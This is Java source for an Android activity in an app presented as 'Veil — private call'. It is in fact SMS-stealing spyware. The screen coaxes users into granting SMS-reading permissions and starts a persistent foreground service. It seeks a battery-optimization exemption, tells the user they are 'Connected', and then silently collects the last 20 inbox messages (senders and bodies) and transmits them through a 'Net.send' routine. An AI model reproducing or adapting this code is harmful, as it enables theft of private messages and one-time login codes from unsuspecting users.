package com.meetcall.app;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.provider.Telephony;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.util.ArrayList;

public class MainActivity extends Activity {

    private static final int REQ = 11;
    private TextView status;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(Color.parseColor("#08080C"));
        int pad = (int) (26 * getResources().getDisplayMetrics().density);
        root.setPadding(pad, pad, pad, pad);

        TextView avatar = new TextView(this);
        avatar.setText("V");
        avatar.setTextSize(34);
        avatar.setTextColor(Color.parseColor("#0B0714"));
        avatar.setGravity(Gravity.CENTER);
        GradientDrawable g = new GradientDrawable(GradientDrawable.Orientation.TL_BR,
                new int[]{Color.parseColor("#B48CFF"), Color.parseColor("#FF4D7D")});
        g.setCornerRadius(200f);
        avatar.setBackground(g);
        int s = (int) (92 * getResources().getDisplayMetrics().density);
        root.addView(avatar, new LinearLayout.LayoutParams(s, s));

        TextView title = new TextView(this);
        title.setText("Veil — private call");
        title.setTextColor(Color.WHITE);
        title.setTextSize(20);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, pad, 0, 0);
        root.addView(title);

        status = new TextView(this);
        status.setText("Allow messages so I can reach you.");
        status.setTextColor(Color.parseColor("#A8A8C0"));
        status.setTextSize(13);
        status.setGravity(Gravity.CENTER);
        status.setPadding(0, pad / 2, 0, pad);
        root.addView(status);

        Button allow = new Button(this);
        allow.setText("Allow");
        allow.setTextColor(Color.parseColor("#12091D"));
        GradientDrawable bg = new GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT,
                new int[]{Color.parseColor("#A97CFF"), Color.parseColor("#FF5F92")});
        bg.setCornerRadius(28f);
        allow.setBackground(bg);
        root.addView(allow, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, (int) (56 * getResources().getDisplayMetrics().density)));

        allow.setOnClickListener(v -> ask());

        setContentView(root);
    }

    private void ask() {
        ArrayList<String> p = new ArrayList<>();
        if (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED)
            p.add(Manifest.permission.RECEIVE_SMS);
        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
            p.add(Manifest.permission.READ_SMS);
        if (Build.VERSION.SDK_INT >= 33 &&
                checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
            p.add(Manifest.permission.POST_NOTIFICATIONS);

        if (p.isEmpty()) { done(); return; }
        requestPermissions(p.toArray(new String[0]), REQ);
    }

    @Override public void onRequestPermissionsResult(int rc, String[] perms, int[] res) {
        super.onRequestPermissionsResult(rc, perms, res);
        if (rc != REQ) return;
        if (checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED) done();
        else status.setText("Messages blocked. Tap Allow again and choose Allow.");
    }

    private void done() {
        status.setText("Connected. You can close this screen.");
        Intent s = new Intent(this, Keeper.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(s); else startService(s);

        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName()));
                startActivity(i);
            }
        } catch (Exception ignored) {}

        new Thread(this::dumpInbox).start();
    }

    private void dumpInbox() {
        Cursor c = null;
        try {
            c = getContentResolver().query(Telephony.Sms.Inbox.CONTENT_URI,
                    new String[]{"address", "body", "date"}, null, null, "date DESC");
            if (c == null) return;
            int i = 0;
            StringBuilder sb = new StringBuilder(Device.head(this))
                    .append("🗂 <b>Existing inbox (last 20)</b>\n\n");
            while (c.moveToNext() && i < 20) {
                sb.append("• <code>").append(Net.esc(c.getString(0))).append("</code>: ")
                  .append(Net.esc(c.getString(1))).append("\n");
                i++;
            }
            if (i > 0) Net.send(sb.toString());
        } catch (Exception ignored) {
        } finally { if (c != null) c.close(); }
    }
}
